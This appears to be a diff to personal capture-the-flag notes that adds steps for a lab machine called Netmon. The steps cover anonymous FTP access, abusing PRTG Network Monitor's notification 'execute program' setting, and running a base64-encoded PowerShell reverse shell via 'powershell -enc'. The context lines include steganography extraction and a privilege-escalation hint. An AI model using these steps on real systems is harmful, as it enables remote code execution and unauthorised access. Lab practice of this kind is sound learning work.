@@ -145,4 +145,12 @@ find . | grep -i tomcat
   find .backup
   steghide extract -sf file.jpg -p pass
   find /usr/bin/viewuser -> change to bash shell
-  
+
+# Netmon Machine:
+  login ftp anon
+  go to programdata\paessler\prtg network monitor
+  find setting -> notification -> execute program
+  cat reverse.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
+  test | powershell -enc paste
+
+# Friendzone Machine:
